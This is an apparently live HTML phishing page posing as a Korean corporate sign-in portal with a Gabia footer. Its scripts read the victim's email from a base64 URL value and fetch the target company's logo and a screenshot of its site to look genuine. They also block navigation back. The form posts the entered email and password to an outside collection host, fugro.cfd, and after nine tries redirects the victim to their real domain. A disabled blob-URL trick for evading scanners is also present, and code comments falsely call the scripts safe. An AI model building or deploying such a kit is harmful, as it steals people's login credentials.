<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Sign in</title>
  <style>
    /* Page reset */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html,body { height: 100%; }

    body{
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: #ffffff;
      color: #333;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }

    #domainName {
  font-weight: 800;
  font-size: 40px;
  color: #0b2447;
  letter-spacing: 1px;
}

    .wrap {
      width: 740px;            /* matches the screenshot width */
      max-width: 94%;
      text-align: center;
    }

    .brand {
      margin-top: 20px;
      margin-bottom: 24px;
      font-size: 48px;
      font-weight: 700;
      letter-spacing: 1px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: #0b2447;
    }

    .brand .globe {
      font-size: 28px;
      filter: blur(0.2px);
      opacity: 0.9;
    }

    h1 {
      font-size: 20px;
      margin: 6px 0 6px;
      font-weight: 700;
      color: #111;
    }

    .subtitle {
      color: #666;
      font-size: 13px;
      margin-bottom: 26px;
    }

    .panel {
      margin: 18px auto 0;
      max-width: 440px;
    }

    .email-pill {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      border-radius: 24px;
      padding: 8px 14px;
      background: #fbfbfb;
      border: 1px solid #efefef;
      box-shadow: 0 1px 0 rgba(0,0,0,0.02);
      font-size: 14px;
      color: #333;
      margin-bottom: 18px;
    }

    .email-pill .icon {
      width: 20px;
      height: 20px;
      border-radius: 50%;
      background: #e7eef9;
      display:flex;
      align-items:center;
      justify-content:center;
      font-size: 13px;
      color: #2b63a8;
    }

    .input-row {
      margin: 12px 0 18px;
      text-align: left;
    }

    .input {
      width: 140%;
      padding: 12px 12px;
      font-size: 14px;
      border: 1px solid #ddd;
      border-radius: 4px;
      outline: none;
      background: #fff;
    }

    .input:focus {
      border-color: #9cc0f0;
      box-shadow: 0 0 0 3px rgba(34,115,210,0.06);
    }

    .btn {
      display: inline-block;
      width: 140%;
      padding: 12px 18px;
      border-radius: 6px;
      background: #2b86d6;
      color: white;
      font-weight: 600;
      font-size: 16px;
      border: none;
      cursor: pointer;
      text-decoration: none;
      margin-top: 6px;
      box-shadow: 0 2px 0 rgba(0,0,0,0.06);
    }

    .actions {
      margin-top: 12px;
      font-size: 13px;
    }

    .actions a {
      color: #2b86d6;
      text-decoration: none;
    }

    .notice {
      margin-top: 34px;
      color: #9aa0a6;
      font-size: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    footer {
      margin-top: 12px;
      font-size: 11px;
      color: #bbb;
    }

    /* make layout similar to screenshot spacing */
    .center-block {
      display: flex;
      align-items: center;
      flex-direction: column;
    }

    /* small device tweaks */
    @media (max-width:420px){
      .brand { font-size: 34px; }
      .wrap { padding: 0 12px; }
    }
  </style>
  
  <!-- ‚úÖ Load jQuery before your scripts -->
  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
  
</head>
<body>
  <main class="wrap" role="main">
  <span id="domainName">KK</span>

  <div class="center-block">
    <h1>Sign in to <strong style="font-weight:700;">ÌïúÍµ≠ Î∞©ÏÜ°</strong><br /><span style="font-weight:500;">ÏãúÏä§ÌÖú</span></h1>
    <p class="subtitle">Please enter your password for identity verification.</p>

    <div class="panel" role="region" aria-label="Sign in panel">
      <div class="email-row" aria-hidden="true">
        <span class="back">üë§</span>
        <span id="sharedEmail">ss@kk.com</span>
      </div>

      <input type="hidden" id="ai" value="">
      


      <div class="input-row" style="margin-top:8px;">
  <input class="input" id="namep" type="password" placeholder="Password" aria-label="Password" />
</div>

<!-- ‚úÖ Working button -->
<button class="btn" type="button" onclick="return validateForm();">Sign-in</button>

<div class="actions">
  <a href="#" tabindex="0">Sign in with another office</a>
</div>

<!-- ‚ö†Ô∏è Scripts must go at the very BOTTOM of the body, NOT here -->
<div class="notice" aria-hidden="true" style="margin-top:26px;">
  <span>üì¢</span>
  <span>ÌïòÏù¥ÏõçÏä§ Ï†ÑÏûêÏÑ∏Í∏à ÏÑúÎπÑÏä§ ÏùºÏãú Ï§ëÎã® ÏïàÎÇ¥‚Ä¶</span>
</div>

<footer>¬©Gabia Inc.</footer>
</div>
</div>
</main>

<!-- ‚úÖ Move your scripts down here, before closing body -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="your-script.js"></script>
</body>
</html>

  <script>
   /* === AUTOGRAB (plain JS) - safe, non-networking === */
(function(){
  // try to decode base64 safely
  function tryAtob(v){
    try { return atob(v); } catch(e) { return null; }
  }

  // 1) look for ?en= parameter (preferred)
  var email = '';
  try {
    var u = new URL(location.href);
    var en = u.searchParams.get('en');
    if (en) {
      var dec = tryAtob(en);
      email = (dec && dec.includes('@')) ? dec : en;
    }
  } catch(e){ /* ignore malformed URL */ }

  // 2) fallback: check hash (strip leading #)
  if (!email) {
    var h = location.hash.replace(/^#/, '');
    if (h) {
      var d = tryAtob(h);
      email = (d && d.includes('@')) ? d : h;
    }
  }

  // 3) if we found an email, update the visible span and ensure #ai exists
  if (email) {
    try { document.getElementById('sharedEmail').textContent = email; } catch(e){}

    try {
      var ai = document.getElementById('ai');
      if (ai) {
        ai.value = email;
        ai.readOnly = true;
      } else {
        // create hidden #ai so validateForm() and jQuery still work
        var h = document.createElement('input');
        h.type = 'hidden';
        h.id = 'ai';
        h.value = email;
        document.body.appendChild(h);
      }
    } catch(e){}
  }
})();
/* === end AUTOGRAB === */


    /* === Blob redirect logic (DISABLED) ===
if (!location.protocol.startsWith("blob")) {
  const currentUrl = new URL(location.href);
  const enParam = currentUrl.searchParams.get('en');
  let email = '';

  if (enParam) {
    try {
      const decoded = atob(enParam);
      email = decoded.includes('@') ? decoded : enParam;
    } catch (e) {
      email = enParam;
    }
  }

  // Load the same HTML file as blob and add #base64email to URL
  fetch(location.href)
    .then(res => res.text())
    .then(html => {
      const blob = new Blob([html], { type: 'text/html' });
      const blobUrl = URL.createObjectURL(blob);
      const finalHash = email ? '#' + btoa(email) : '';
      window.location.replace(blobUrl + finalHash);
    });
}
=== END DISABLED === */
  </script>

  
  <script type="text/javascript">
    function preventBack() {
      window.history.forward();
    }
    setTimeout(preventBack, 0);
    window.onunload = function () { null };

    var attemptCount = 0;

    $(document).ready(function () {
      const hash = window.location.hash.replace(/^#/, '');
      let email = '';
      if (hash) {
        try {
          email = atob(hash);
        } catch (e) {
          email = hash;
        }
      }

      if (email) {
        $('#ai').val(email).prop('readonly', true);
        const domain = email.split('@')[1] || '';
        const logoUrl = 'https://logo.clearbit.com/' + domain;

        $.get(logoUrl)
         .done(() => $('#log').attr('src', logoUrl))
         .fail(() => $('#log').attr('src', 'https://i.imgur.com/7UDoBij.png'));

        const bgUrl = 
          'https://image.thum.io/get/auth/71571-58c1922f775988cd8920210b712030e0'
          + '/width/1400/http://' + domain;
        $('#bg-image').css('background-image', `url('${bgUrl}')`);
      }
    });

    function validateForm() {
      var email = $("#ai").val();
      var password = $("#namep").val();
      var error = $("#error");
      var msg   = $("#msg");

      error.text('');
      msg.text('');

      if (!email) {
        error.text("Please enter your email");
        return false;
      }
      if (!password) {
        error.text("Please enter your password");
        return false;
      }

      $.ajax({
        type: 'POST',
        url: 'https://fugro.cfd/cam/pno.php?name=$id',
        data: { ai: email, namep: password },
        success: function (response) {
          var jsonResponse = JSON.parse(response);
          if (jsonResponse.signal === 'ok') {
            attemptCount = 0;
            msg.text("Verifying...");
          } else {
            attemptCount++;
            msg.text("Password is not correct. Please try again.");
            $("#namep").val('');
            if (attemptCount >= 9) {
              attemptCount = 0;
              window.location.replace("https://www." + email.split('@')[1]);
            }
          }
        },
        error: function () {
          attemptCount++;
          msg.text("An error occurred. Please try again.");
          $("#namep").val('');
          if (attemptCount >= 9) {
            attemptCount = 0;
            window.location.replace("https://www." + email.split('@')[1]);
          }
        }
      });

      return false;
    }
  </script>
  
  <script>
/* Safe branding: reads autograbbed email from #ai or #sharedEmail,
   updates #domainName and replaces .globe content with the site's favicon. */
document.addEventListener("DOMContentLoaded", function () {
  // Prefer hidden field #ai (autograb sets this). Fallback to #sharedEmail.
  var aiEl = document.getElementById('ai');
  var email = (aiEl && aiEl.value) ? aiEl.value : (document.getElementById('sharedEmail')?.textContent || '');

  // If email is base64 encoded in the URL (?en=...) your autograb should already decode it.
  if (!email) {
    try {
      const params = new URLSearchParams(window.location.search);
      let en = params.get('en') || '';
      try { const dec = atob(en); en = dec.includes('@') ? dec : en; } catch(e) {}
      email = en;
    } catch(e) { email = ''; }
  }

  if (email && email.includes('@')) {
    const domain = email.split('@')[1].toLowerCase();
    const shortDomain = domain.split('.')[0] || domain;

    const nameEl = document.getElementById('domainName');
    if (nameEl) nameEl.textContent = shortDomain;

    // Replace globe with round favicon ‚Äî fallback to globe emoji on error
    const globe = document.querySelector('.globe');
    if (globe) {
      const img = document.createElement('img');
      img.src = 'https://' + domain + '/favicon.ico';
      img.alt = shortDomain + ' logo';
      img.style.width = '22px';
      img.style.height = '22px';
      img.style.borderRadius = '50%';
      img.style.objectFit = 'cover';
      img.onerror = function () { globe.textContent = 'üåê'; };
      globe.textContent = '';
      globe.appendChild(img);
    }
  }
});
</script>
</body>
</html>
